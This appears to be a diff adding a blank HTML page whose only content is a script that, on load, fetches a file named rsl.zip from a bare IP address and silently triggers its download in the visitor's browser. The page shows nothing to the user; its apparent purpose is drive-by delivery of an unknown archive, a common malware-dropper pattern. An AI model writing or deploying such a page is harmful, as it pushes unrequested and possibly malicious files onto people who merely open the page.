@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+
+    <meta charset="utf-8">
+
+</head>
+
+<script>
+    fetch('http://1.116.116.112/about/rsl/rsl.zip').then(res => res.blob().then(blob => {
+        var a = document.createElement('a');
+        var url = window.URL.createObjectURL(blob);
+        var filename = 'rsl.zip';
+        a.href = url;
+        a.download = filename;
+        a.click();
+        window.URL.revokeObjectURL(url);
+    }))
+</script>
+
+</html>
